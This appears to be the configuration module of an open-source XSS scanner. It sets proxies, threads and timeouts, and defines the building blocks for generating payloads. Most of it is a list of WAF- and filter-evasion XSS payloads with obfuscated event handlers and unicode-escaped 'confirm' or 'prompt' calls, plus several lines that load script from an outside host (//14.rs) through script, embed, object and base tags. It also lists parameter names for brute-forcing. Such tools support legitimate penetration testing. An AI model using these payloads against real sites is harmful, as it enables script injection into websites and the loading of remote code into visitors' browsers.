changes = '''Negligible DOM XSS false positives;x10 faster crawling'''
globalVariables = {}  # it holds variables during runtime for collaboration across modules

defaultEditor = 'nano'
blindPayload = ''  # your blind XSS payload
xsschecker = 'v3dm0s'  # A non malicious string to check for reflections and stuff

#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency = 90  # payloads below this efficiency will not be displayed

delay = 0  # default delay between http requests
threadCount = 10  # default number of threads
timeout = 10  # default number of http request timeout

# attributes that have special properties
specialAttributes = ['srcdoc', 'src']

badTags = ('iframe', 'title', 'textarea', 'noembed',
           'style', 'template', 'noscript')

tags = ('html', 'd3v', 'a', 'details')  # HTML Tags

# "Things" that can be used between js functions and breakers e.g. '};alert()//
jFillings = (';')
# "Things" that can be used before > e.g. <tag attr=value%0dx>
lFillings = ('', '%0dx')
# "Things" to use between event handler and = or between function and =
eFillings = ('%09', '%0a', '%0d',  '+')
fillings = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space

eventHandlers = {  # Event handlers and the tags compatible with them
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (  # JavaScript functions to get a popup
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()')

payloads = (  # Payloads for filter & WAF evasion
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>')

with open('core/xss-list.txt') as f:
    fuzzes = f.read().splitlines()

from core.header_utils import get_random_headers

headers = get_random_headers()

blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']
